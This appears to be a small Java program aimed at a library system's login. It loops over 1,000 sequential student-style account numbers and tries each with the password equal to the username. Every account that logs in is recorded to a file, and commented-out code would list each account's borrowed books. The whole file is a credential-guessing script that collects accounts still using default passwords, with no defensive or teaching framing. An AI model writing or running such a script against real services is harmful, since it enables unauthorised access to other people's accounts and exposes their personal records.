package com.xixi.LibApp;


import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.nio.Buffer;

import demo.HttpClient;

/**
 * Hello world!
 *
 */
public class App 
{
    public static void main ( String[] args ) throws Exception
    {
    	HttpClient client=new HttpClient();
    	String baseName="221150";
    	String basePass=baseName;
    	int num=7000;
    	BufferedWriter wirter=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File("name.txt"))));
		
    	for (int i = 0; i < 1000; i++) {
    		client.setName(baseName+(num+i));
    		client.setPass(basePass+(num+i));
    		boolean flag=client.login();
    		if(flag){
//    			System.out.println(client.getName());
    			wirter.write(client.getName());
    			wirter.newLine();
//    			ArrayList<Book> lists=client.getBorrowBooks();
//    			for (int j = 0; j < lists.size(); j++) {
//					System.out.println(lists.get(j).toString());
//				}
    		}
		}
    	wirter.flush();
    	wirter.close();
    	
    	
    }
}
